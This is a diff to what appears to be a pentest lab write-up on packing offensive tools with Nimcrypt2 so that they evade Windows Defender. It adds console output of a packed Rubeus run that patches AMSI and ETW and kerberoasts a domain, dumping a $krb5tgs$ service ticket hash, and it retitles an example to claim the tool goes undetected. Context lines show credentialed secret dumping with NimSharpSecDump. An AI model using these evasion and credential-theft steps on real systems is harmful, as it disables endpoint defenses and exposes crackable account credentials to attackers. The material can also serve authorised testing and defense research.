@@ -76,7 +76,7 @@ STEP 3 - Run the packed version of tool 'NimSharSecDump.exe' whithout being dete
 The tool is run on a Windows 10 laptop (with Defender AV enabled and up-to-date) and the target is a fully patched Windows 2016 of my pentest lab
 (with Defender AV enabled and up-to-date).
 
-C:\Users\Administrator.PO718687\Documents\Tools-AD>NimSharpSecDump.exe -target=192.168.1.196  -u=administrator -p=superpasswordlabtest -d=.
+C:\Users\Administrator\Documents\Tools-AD>NimSharpSecDump.exe -target=192.168.1.196  -u=administrator -p=superpasswordlabtest -d=.
 [*] Running sandbox checks...
 [*] Applying amsi patch: true
 [*] Applying etw patch: true
@@ -109,7 +109,7 @@ NL$KM:6f11bbb5951aab1a3bf8bb712f79084c0b35eaea18c73ecad75aa4759920e644ce53902da5
 
 
 ================================================================================================================================================
-Example 2 - The tool Rubeus is detected when executed but not blocked by Defender AV after being packed by Nimcrypt2
+Example 2 - The tool Rubeus is not detected nor blocked by Defender AV after being packed by Nimcrypt2
 ================================================================================================================================================
 
 STEP 1 - Download the code of the tool Rubeus from Github and compile it
@@ -166,4 +166,60 @@ STEP 3 - Run the packed version of tool 'NimRubeus.exe' whithout being detected 
 
 The tool is run on a Windows 2016 server (with Defender AV enabled and up-to-date) and the target is a fully patched Windows 2016 Domain Controller of my pentest lab
 (with Defender AV enabled and up-to-date).
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\alain>cd C:\
+C:\>cd Temp_audit
+
+C:\Temp_audit>NimRubeus.exe kerberoast
+[*] Running sandbox checks...
+[*] Applying amsi patch: true
+[*] Applying etw patch: true
+[*] Decrypting packed exe...
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 5
+
+
+[*] SamAccountName         : svc_vulscanner
+[*] DistinguishedName      : CN=svc vulnscanner,CN=Users,DC=company,DC=work
+[*] ServicePrincipalName   : DC1/svc_vulnscanner.company.work:8080
+[*] PwdLastSet             : 8/24/2022 7:21:41 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_vulscanner$company.work$DC1/svc_vulnscanner.company.work:8080*$
+                             4F6C44F4BAD527B296A5CEBF77B81E47$BF3FE98BB007498921AB45D1E8D7826F4677303A2F912BF
+                             90BAFA78A27DC707AB663AD7081F27859A3AC61E6B72397356726F432E963187E79EC909B51CBB93
+                             D0CE1140A7E9E587509B5B0E665E1D2E7A1A88F70F08ADA5838DD5C6AEB0BE7C1D2C0BF709B8DC14
+                             6BA9EE505D7E3D6451DCD54C5492B4D1DE452B56747449EFE67FD57ABDF07E40FC135ADDB3DA451C
+                             332FE001A990A8052DEEF7C7DAFEAB5B2613B83900BCD294C17F4DB260BB9A0EEAA59D6EC5D22165
+                             95011A9E9BAC4002B8380CBA7F8331EDBF606F0651A7ECA81BA84363E17A1E6BEC5E3CB6ECDED0E5
+                             C4F7F68A6369D48AAC965D68A373DC6C7B434CDBE31D539E3176DB30939957F9025481BB98F01522
+                             4A473740FEF51551125A319BB38624CB54AD76AC0D6EBB477E2D9051C0907B4CB92FBC09B648457B
+                             2D44117A882945FE6B95424FEDCCA27D34B7DE2D92724822B1016183BFEA9FF7A52C93775C539C0C
+                             B1CC79D3EBD8451389FB1951C4690BB6052A2B2AB0F541096F8D6780EF1B3B6B32172BF19CE8C99A
+                             552F08074B1630E8245274DB385F3CAE6542FD69F0D5762CB071747036631845D0ED17C4C7933A4C
+                             8F5836EC3D0B5ED2361A6A5D7B1A5222BFB705C3A2D619E3BAAC17A51437497E90A40B96CFCAB414
+                             F6C73EB488C56E384E56CC11B9E5509B959F298B97418F400EB26F3444EFCED8D45ADB8F0DE6747B
+                             58D04CADDC40EDC52CA882DCE61F6F774287F69FE7EA29B13385C3E3E663AA1552A805BE51047877
+                             4562FBB44A7F3AC73D3D95441790FCA4E833B85A35494FFBB63B58A992512FD67C58E7B776E4F7EF
+                             <SNIP>
 
